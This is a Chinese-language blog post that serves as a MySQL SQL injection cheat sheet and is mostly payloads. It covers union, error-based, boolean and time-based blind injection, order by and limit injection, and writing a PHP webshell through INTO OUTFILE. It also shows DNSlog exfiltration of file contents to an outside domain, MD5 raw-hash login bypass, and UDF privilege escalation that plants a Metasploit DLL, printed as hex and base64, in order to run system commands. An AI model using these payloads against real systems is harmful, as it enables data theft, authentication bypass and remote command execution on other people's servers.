---
title: "Mysql Injection"
date: 2020-01-06T17:05:39+08:00
draft: false
tags: [SQL注入]
categories: []
comment: true
---
Mysql Injection
<!--more-->
# MYSQL注入

### 函数
version()——MySQL 版本
user()——数据库用户名
database()——数据库名
@@datadir——数据库路径
@@version_compile_os——操作系统版本
information_schema 自带数据库
information_schema.schemata 数据库
information_schema.tables 数据表
information_schema.columns 数据列
floor函数返回小于等于该值的最大整数
RAND()函数调用可以在0和1之间产生一个随机数
join(连接)

## 联合注入

```
union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=database()) --+
```

## 报错注入：

```
rand()
```
![](https://pic.superbed.cn/item/5dcbf1df8e0e2e3ee9eb629e.jpg)
```
floor()
```
![](https://pic.superbed.cn/item/5dcbf31c8e0e2e3ee9eb8939.jpg)

```
and (select 1 from (select count(*),concat((payload),floor (rand(0)*2))x from information_schema.tables group by x)a)

and (select count(*) from information_schema.tables group by concat(user(),floor(rand(0)*2))) -- +
```
```
1' and updatexml(1,user(),1) --+
只有在payload返回的不是xml格式才会生效,其最长输出32位
```
```
extractvalue(1,concat('~',user(),'~'))
其最长输出32位
```

简化
```
select count(*) from information_schema.tables group by concat(version(), floor(rand(0)*2))
```
关键表被禁用
```
select count(*) from (select 1 union select null union
select !1)a group by concat(version(),floor(rand(0)*2))
```
rand 禁用
```
select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)
```

exp
```
select exp(~(select * FROM(SELECT USER())a))
```

mysql重复性
```
select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
```
##  布尔注入

```
left(database(),1)>'s'

截取数据库第一位
```

```
ascii(substr((select table_name information_schema.tables where tables_schema =database()limit 0,1),1,1))=101 --+
```
```
substr(a,b,c) 从b位置开始，截取字符串a的c长度
```
```
ascii() 将某个字符转为ascii值
```
```
ascii(substr(select database()),1,1)=98
```
```
ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))>98%23
```
```
mid(a,b,c) 从位置b开始，街区a字符床的c位
```
```
ord()同ascii()，将字符串转为ascii值
```

## regexp 正则注入

```
select user() regexp '^[a-z]';

select user() regexp '^ro'

I select * from users where id=1 and 1=(if((user() regexp '^r'),1,0));

select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^us[a-z]' limit 0,1);

```

## like 匹配注入

```
select user() like 'root%'
```

## 延时注入

```
If(ascii(substr(database(),1,1))>115,0,sleep(5))%23

UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘M SG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;
```

## 导入导出操作

```
load_file()导出文件

Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92, 114,101,112,97,105,114,92,115,97,109)))

-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105)) 
Explain:“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的 ASCII 代码
-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69) Explain:“c:/boot.ini”的 16 进制是“0x633a2f626f6f742e696e69”
-1 union select 1,1,1,load_file(c:\\boot.ini) Explain:路径里的/用 \\代替

```

## Mysql False注入

==遇到引号闭合的变量时==
```
如果两个参数比较，有至少一个NULL，结果就是NULL，除了是用NULL<=>NULL 会返回1。不做类型转换
---------------------------------------------
两个参数都是字符串，按照字符串比较。不做类型转换
---------------------------------------------
两个参数都是整数，按照整数比较。不做类型转换
---------------------------------------------
如果不与数字进行比较，则将十六进制值视为二进制字符串。
---------------------------------------------
有一个参数是 TIMESTAMP 或 DATETIME，并且另外一个参数是常量，常量会被转换为时间戳
---------------------------------------------
有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较
---------------------------------------------
所有其他情况下，两个参数都会被转换为浮点数再进行比较
---------------------------------------------
最后那一句话很重要，说明如果我是字符串和数字比较，需要将字符串转为浮点数，这很明显会转换失败
```

![](https://ae01.alicdn.com/kf/Hd954de6df5e641a39cdcfa050f7215fdo.jpg)

### 算数运算
- + 

```
username= 'admin'+(payload)
```
![](https://ae01.alicdn.com/kf/H523d3e670d5f4d478d0aa8beedcd466fq.jpg)
- - 

```
username ='admin'--(payload)
```
![](https://ae01.alicdn.com/kf/Hdfa18fd2209742f0876b82770d7f8809i.jpg)
- * 

```
username ='1abc'* (payload)
```
- / 

```
username ='1abc'/ (payload)
```

```
1’-(ascii(mid((passwd)from(n)))=m)-’ 

正常的用法如下，对于str字符串，从pos作为索引值位置开始，返回截取len长度的子字符串

MID(str,pos,len)
这里的用法是，from(1)表示从第一个位置开始截取剩下的字符串，for(1)表示从改位置起一次就截取一个字符

mid((str)from(i))
mid((str)from(i)for(1))

```

### 位运算
- & 

```
username='1abc'&(payload)
```
![](https://ae01.alicdn.com/kf/H061891db89194f2cb36ec7f1792dbcc8u.jpg)

- |  或
- ^  异或
- '<<0'>>0# 移位操作

###逻辑运算
- <> 不等于
```
username='admin'<>(payload)
```

- = 等于
```
username='admin'=(payload)
```

### 其他
```
'+1 is not null#  
'in(-1,1)#  
'not in(1,0)#  
'like 1#  
'REGEXP 1#  
'BETWEEN 1 AND 1#  
'div 1#  
'xor 1#  
'=round(0,1)='1  
'<>ifnull(1,2)='1
```

## Mysql 无列名注入

```
select * from users
```
![](https://ae01.alicdn.com/kf/Hc656c2e1dd0348dd96806231e537cbdfj.jpg)

```
select 1,2,3 union select * from users;
```

![](https://ae01.alicdn.com/kf/H7c76e69fb778415691ea95d325c2e513j.jpg)

```
select `2` from (select 1,2,3 union select * from users)redforce;
```

![](https://ae01.alicdn.com/kf/Hee222a2322e842c4824ece7eff8f97459.jpg)

```
select * from users where id=-1 union select 1,(select concat(`2`,0x3a,`3`) from (select 1,2,3 union select * from users)a limit 1,1),3;
```
![](https://ae01.alicdn.com/kf/H639f71bf43fd4ae4ac0adc2f334b18beF.jpg)

### 查询几个字段数目

```
select * from (select 1)a,(select 2)b,(select 3 )c union select * from users
```

## Mysql order by 注入

### union 注入

```
 select * from users
```
![](https://ae01.alicdn.com/kf/Hbf916d7115744ff2aa40779d50203ae6o.jpg)

```
select * from users union select 1,2,3 order by 3
```
![](https://ae01.alicdn.com/kf/H92f72960280148b5969f9c7ed062ca158.jpg)

```
select * from users union select 1,2,'admin' order by 3
```
![](https://ae01.alicdn.com/kf/Hf8b6f976db9044a994034dd6eb80a16b9.jpg)

```
select * from users union select 1,2,'adminaa' order by 3
```
![](https://ae01.alicdn.com/kf/H89eb2047bb3b49cabdeb83b17b33515fq.jpg)

### if盲注

- 需要知道列名

```
order by if(1=1,id,username)
```

- 不需要知道列名

```
order by if(表达式,1,(select id from information_schema.tables))
```
==如果表达式为false时，sql语句会报ERROR 1242 (21000): Subquery returns more than 1 row的错误，导致查询内容为空，如果表达式为true是，则会返回正常的页面。==

### 基于时间的盲注

```
order by if(1=1,1,sleep(1))
```

### 基于rand()的盲注

```
select * from ha order by rand(true)
```
mysql> select * from ha order by rand(true);
+----+------+
| id | name |
+----+------+
|  9 | NULL |
|  6 | NULL |
|  5 | NULL |
|  1 | dss  |
|  0 | dasd |
+----+------+
mysql> select * from ha order by rand(false);
+----+------+
| id | name |
+----+------+
|  1 | dss  |
|  6 | NULL |
|  0 | dasd |
|  5 | NULL |
|  9 | NULL |
+----+------+

```
order by rand(ascii(mid((select database()),1,1))>96)
```

### 步骤

- 判断

```
http://192.168.239.2:81/?order=IF(1=1,name,price) 通过name字段排序
http://192.168.239.2:81/?order=IF(1=2,name,price) 通过price字段排序
/?order=(CASE+WHEN+(1=1)+THEN+name+ELSE+price+END) 通过name字段排序
/?order=(CASE+WHEN+(1=1)+THEN+name+ELSE+price+END) 通过price字段排序
http://192.168.239.2:81/?order=IFNULL(NULL,price) 通过name字段排序
http://192.168.239.2:81/?order=IFNULL(NULL,name) 通过price字段排序
可以观测到排序的结果不一样

http://192.168.239.2:81/?order=rand(1=1) 
http://192.168.239.2:81/?order=rand(1=2)
```

```
/?order=(select+1+regexp+if(substring((select+concat(table_name)from+information_schema.tables+where+table_schema%3ddatabase()+limit+0,1),1,1)=0x67,1,0x00))  正确
/?order=(select+1+regexp+if(substring((select+concat(table_name)from+information_schema.tables+where+table_schema%3ddatabase()+limit+0,1),1,1)=0x66,1,0x00)) 错误
```

**regexp 用前面的1和后面的返回结果比较**

>>https://www.cnblogs.com/icez/p/Mysql-Order-By-Injection-Summary.html


## limit 注入

### 不存在order by 关键字

```
select id from users limit 0,1
```

![](https://ae01.alicdn.com/kf/Hdd54f086a82b4fe9b8f442f083fae738k.jpg)

```
select id from users limit 0,1 union select username from users;
```

![](https://ae01.alicdn.com/kf/He5036eef04164ef38d83d2b95b3186afJ.jpg)

### 存在 order by 关键字（无法使用union select）

![](https://ae01.alicdn.com/kf/H77658e82a26349239eb92e51c28b1f16d.jpg)

**此方法适用于5.0.0< MySQL <5.6.6版本**

```
PROCEDURE函数
```

- 报错注入

```
select id from users order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
```
![](https://ae01.alicdn.com/kf/H58f5c6058f644d28b34a17e3a4b97189e.jpg)

- 延时注入

```
select * from admin where id >0 order by id limit 0,1 PROCEDURE analyse(extractvalue(rand(),concat(0x3a,(if(1=1,benchmark(2000000,md5(404)),1)))),1);
```

## 报错注入邂逅load_file&into outfile搭讪LINES
```
FIELDS TERMINATED BY原理为在输出数据的每个字段之间插入webshell内容，所以如果select返回的只有一个字段，则写入的文件不包含webshell内容,例如下面语句SELECT username FROM user WHERE id = 1 into outfile 'D:/1.php' FIELDS TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e，写入的文件中只包含username的值而没有webshell内容;

LINES TERMINATED BY和LINES STARTING BY原理为在输出每条记录的结尾或开始处插入webshell内容，所以即使只查询一个字段也可以写入webshell内容，更为通用。此外，该类方式可以引用于limit等不能union的语句之后进行写文件操作。
```
### into outfile 写文件

- union写文件

```
SELECT * FROM user WHERE id = -1 union select 1,2,0x3c3f70687020706870696e666f28293b3f3e into outfile 'D:/1.php'
```
- FIELDS TERMINATED BY（可在limit等语句后）

```
SELECT * FROM user WHERE id = 1 into outfile 'D:/1.php' fields terminated by 0x3c3f70687020706870696e666f28293b3f3e
```

-  LINES TERMINATED BY（可用于limit等sql注入）

```
SELECT username FROM user WHERE id = 1 into outfile 'D:/1.php' LINES TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e
```

- LINES STARTING BY（可用于limit等sql注入）

```
SELECT username FROM user WHERE id = 1 into outfile 'D:/2.php' LINES STARTING  BY 0x3c3f70687020706870696e666f28293b3f3e
```

###Load_file 读文件

- 联合注入+load_file读文件

```
SELECT * FROM user WHERE id=-1 UNION select 1,'1',(select load_file('D:/1.php'))
```

- DNSLOG带外查询

```
SELECT id FROM user WHERE id = load_file (concat('\\\\',hex((select load_file('D:/1.php'))),'.t00ls.xxxxxxxxx.tu4.org\\a.txt'))
```

- 报错注入+load_file读文件

```
select * from user  where username = '' and updatexml(0,concat(0x7e,(LOAD_FILE('D:/1.php')),0x7e),0)

select * from user where id=1 and (extractvalue(1,concat(0x7e,(select (LOAD_FILE('D:/1.php'))),0x7e)))
```

### 扫描文件是否存在
**load_file读取文件时，如果没有对应的权限获取或者文件不存在则函数返回NULL,所以结合isnull+load_file可以扫描判断文件名是否存在**

- 如果文件存在，isnull(load_file('文件名'))返回0

```
mysql> select * from user  where username = '' and updatexml(0,concat(0x7e,isnull(LOAD_FILE('D:/1.php')),0x7e),0);
ERROR 1105 (HY000): XPATH syntax error: '~0~'
```

- 如果文件不存在isnull(load_file('文件名'))返回1

```
mysql> select * from user  where username = '' and updatexml(0,concat(0x7e,isnull(LOAD_FILE('D:/xxxxx')),0x7e),0);
ERROR 1105 (HY000): XPATH syntax error: '~1~'
```

### 另类写文件
```
SELECT ... INTO DUMPFILE'file_path'
```

## 笛卡尔积延时注入

```
SELECT count(*) FROM information_schema.columns A;
```
![](https://ae01.alicdn.com/kf/H09e769a89c554836b70373d8130134dcz.jpg)

```
SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C;
```

![](https://ae01.alicdn.com/kf/H9f13bf0489a44c8082990a77ec0c2f860.jpg)

## Insert、update注入新思路

![](https://ae01.alicdn.com/kf/H114a5a2796b24ecc8b1c1c4dccf67ba9d.jpg)

![](https://ae01.alicdn.com/kf/H9fc23bdd0b5844c5a41c58e5fed8bd04z.jpg)

![](https://ae01.alicdn.com/kf/H4ec8fc2b48de4ee7bf8cf45799d7094cU.jpg)

![](https://ae01.alicdn.com/kf/H256914b5da104dd389f6ce29272ea01cc.jpg)
- 字符串《==》数字
```
conv() 进制转换
```

![](https://ae01.alicdn.com/kf/H6b4a6c0c17d74944a2bf8a056538ec50d.jpg)

- 获取的数据超过8个字节

```
select conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)), 16, 10);
```
![](https://ae01.alicdn.com/kf/H044f3ecd33044adaaa3f383b63b5a8c6u.jpg)

- 获取表名

```
select conv(hex(substr((select table_name from information_schema.tables where table_schema=schema() limit 0,1),1 + (n-1) * 8, 8*n)), 16, 10);
```

![](https://ae01.alicdn.com/kf/Hf9f39a2e0b7747ecb685de22873634943.jpg)

- 获取列名

```
select conv(hex(substr((select column_name from information_schema.columns where table_name=’Name of your table’ limit 0,1),1 + (n-1) * 8, 8*n)), 16, 10);
```

- 利用update语句

```
update users set username = 'test' | conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)), 16, 10) where id =16
```

- 利用 INSERT语句

```
insert into users values (17,'james', 'bond');
```

```
insert into users values (17,'james', 'bond'|conv(hex(substr(user(),1 + (n-1) * 8, 8* n)),16, 10);
```

- Mysql 5.7中的限制 

```
update users set username = '0' | conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)), 16, 10) where id =16
```

- 编码解码

```
conv(hex(value, 16, 10)
```
```
select unhex(conv(value, 10, 16));
```

## mysql大整数溢出报错

![](https://ae01.alicdn.com/kf/H6addec488706403da224e768cfb174028.jpg)

- 获取表名

```
!(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x)-~0
```

- 获取列名

```
select !(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x)-~0;
```

- 检索数据

```
!(select*from(select concat_ws(':',id, username, password) from users limit 0,1)x)-~0;
```

- 一次获取全部表与列

```
!(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)-~0

(select(!x-~0)from(select(concat (@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat (@,0xa,table_name,0x3a3a,column_name)),@))x)a)

(select!x-~0.from(select(concat (@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat (@,0xa,table_name,0x3a3a,column_name)),@))x)a)
```

![](https://ae01.alicdn.com/kf/Hd1abddb9c8ba4f59a89fc03c39f8dd67b.jpg)

>>https://osandamalith.com/2015/07/08/bigint-overflow-error-based-sql-injection/


## MD5哈希注入

- 代码中语句

```
$sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";
```

**如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。**

```
ffifdyop    --> 'or'

esvh        --> '='

129581926211651571912466741651878684928 --> 'or'
```

>>https://bbs.ichunqiu.com/article-1766-1.html


## show columns 注入

- php代码

```
mysql_query("show columns from `shop_{$table}`") or die("show coulumns 出错:".mysql_error());
show columns 
```

![](https://ae01.alicdn.com/kf/H47673f9ce5214b6794f8a3f52cf6885aE.jpg)

- 注入

```
table=123` where updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)#
```

![](https://ae01.alicdn.com/kf/H47673f9ce5214b6794f8a3f52cf6885aE.jpg)


## MySQL数据库的Innodb引擎的注入

**当目标程序过滤了关键字,如information,在注入时,使用select database()关键字查询出当前库名后,无法通过查询information_schema.tables表查询当前库的表名**

- Innodb 的表

```
mysql.innodb_table_stats
mysql.innodb_index_stats
```

- 字段

```
database_name ， table_name 
```

- 例子：

```
group_concat(table_name) from mysql.innodb_table_stats where database_name =database() #
```

## Mysql约束攻击

- 参考

>> http://www.goodwaf.com/2016/12/30/%E5%9F%BA%E4%BA%8E%E7%BA%A6%E6%9D%9F%E6%9D%A1%E4%BB%B6%E7%9A%84SQL%E6%94%BB%E5%87%BB/

- 条件限制

```
服务端没有对用户名长度进行限制
登陆验证的SQL语句必须是用户名和密码一起验证
验证成功后返回的必须是用户传递进来的用户名，而不是从数据库取出的用户名
```

- 攻击原理

```
INSERT截断:当设计一个字段时，我们都必须对其设定一个最大长度，比如CHAR(10)，VARCHAR(20)等等。但是当实际插入数据的长度超过限制时，数据库就会将其进行截断，只保留限定的长度。
```

```
在数据库对字符串进行比较时，如果两个字符串的长度不一样，则会将较短的字符串末尾填充空格，使两个字符串的长度一致，比如，字符串A:[String]和字符串B:[String2]进行比较时，由于String2比String多了一个字符串，这时MySQL会将字符串A填充为[String ]，即在原来字符串后面加了一个空格，使两个字符串长度一致。
```

- 服务端代码

```
<?php
$username = mysql_real_escape_string($_GET['username']);
$password = mysql_real_escape_string($_GET['password']);
$query = "SELECT username FROM users
          WHERE username='$username'
              AND password='$password' ";
$res = mysql_query($query, $database);
if($res) {
  if(mysql_num_rows($res) > 0){
      return $username;//此处较原文有改动
  }
}
return Null;
?>
```
- 攻击

```
注册一个[Dumb          done]的用户
```

## MySQL列名重复 报错

- Example

```
select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
```

![](https://ae01.alicdn.com/kf/Hc338c81da5b44512a8d83913d13de0abP.jpg)

- join函数爆列名

```
select *  from(select * from users a join users b)c;
```
![](https://ae01.alicdn.com/kf/H8c2e81af91f444d9be000a9c77825fe1J.jpg)

```
select *  from(select * from users a join users b using(id))c;
```

![](https://ae01.alicdn.com/kf/Ha11dd656262249bc97ccf3e572bf7a60h.jpg)

- 爆数据

```
select * from (select * from users a join users b using(id,username,password))c;
```

![](https://ae01.alicdn.com/kf/He4e632e6a2004cc8a33366706ade2d70g.jpg)

- 关于 join参考

>>http://wxb.github.io/2016/12/15/MySQL%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8Djoin.html


## MySQL UDF Exploitation

>>https://osandamalith.com/2018/02/11/mysql-udf-exploitation/

```
select host, user, password from mysql.user;
```
![](https://ae01.alicdn.com/kf/H1c9d1a119ac74ac9b717c68f51c39e32g.jpg)

```
select * from mysql.user where user = substring_index(user(), '@', 1) ;
```

![](https://ae01.alicdn.com/kf/H35f812e965b942b9b16a989feea063dbw.jpg)

- dll下载地址

```
https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql
```

- 获取当前操作系统以及数据库架构情况

```
select @@version_compile_os, @@version_compile_machine

show variables like '%compile%';
```
![](https://ae01.alicdn.com/kf/H30985732ca5b411aa9bb4040986853d3S.jpg)

- 查找plugin文件夹

**MySQL 5.0.67以后udf.dll必须位于plugin文件夹**

```
select @@plugin_dir ;
show variables like 'plugin%';
```

![](https://ae01.alicdn.com/kf/Hebbbdd52841e4b1e800770ad9e381e8fW.jpg)

- 旧版本可以使用目录

```
@@datadir
@@basedir\bin
C:\windows
C:\windows\system
C:\windows\system32
```

### 上传二进制文件

- 网络共享

```
select load_file('\\\\192.168.0.19\\network\\lib_mysqludf_sys_64.dll') into dumpfile "D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll";
```

- 十六进制编码

```
select hex(load_file('/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll')) into dumpfile '/tmp/udf.hex';

select 0x4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000000000000000000000… into dump file "D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll";
```

-  创建表拼接

```
create table temp(data longblob);

insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);

update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000);

select data from temp into dump file "D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll";
```

- MySQL 5.6.1/MariaDB 10.0.5

**to_base64和from_base64函数**

```
select to_base64(load_file('/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll')) 
into dumpfile '/tmp/udf.b64';
```

**编辑base64文件并通过以下方式将其dump到插件目录**

```
select from_base64("TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v
ZGUuDQ0KJAAAAAAAAAAzwu3gd6ODs3ejg7N3o4OzafEQs3Wjg7Np8QCzfaODs2nxB7N1o4OzUGX4
s3Sjg7N3o4KzW6ODs2nxCrN2o4OzafEWs3Wjg7Np8RGzdqODs2nxErN2o4OzUmljaHejg7MAAAAA
AAAAAAAAAAAAAAAAUEUAAGSGBgBwsYNLAAAAAAAAAADwACIgCwIJAAASAAAAFgAAAAAAADQaAAAA
EAAAAAAAgAEAAAAAEAAAAAIAAAUAAgAAAAAABQACAAAAAAAAgAAAAAQAADPOAAACAEABAAAQAAAA
AAAAEAAAAAAAAAAAEAAAAAAAABAAAAAAAAAAAAAAEAAAAAA5AAAFAgAAQDQAADwAAAAAYAAAsAIA
AABQAABoAQAAAAAAAAAAAAAAcAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAwAABwAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAAAR
EAAAABAAAAASAAAABAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAABQsAAAAwAAAADAAAABYAAAAA") 
into dumpfile "D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll";
```

### DLL使用

- 查找到mysql的目录

```
select @@basedir;
```


- 创建文件夹（没测试成功）

```
select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION';    //利用NTFS ADS创建lib目录
 
select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION';    //利用NTFS ADS创建plugin目录
```

- 改变plugin目录位置

```
mysqld.exe –plugin-dir=C:\\temp\\plugins\\
```

- 上传dll

![](https://ae01.alicdn.com/kf/H584c9e7e2eae4110be942b8adfb9de7ba.jpg)

- 安装

```
create function sys_exec returns int soname 'udf.dll';
```

- 验证

```
select * from mysql.func where name = 'sys_exec';
```

![](https://ae01.alicdn.com/kf/H4686105bc9b24c8dbbca57ca744a9ec4W.jpg)

- 删除

```
drop function sys_exec;
```

- 执行

```
select sys_exec('cmd');
```

![](https://ae01.alicdn.com/kf/H35996863ea5f4319930172b9924440f4D.jpg)


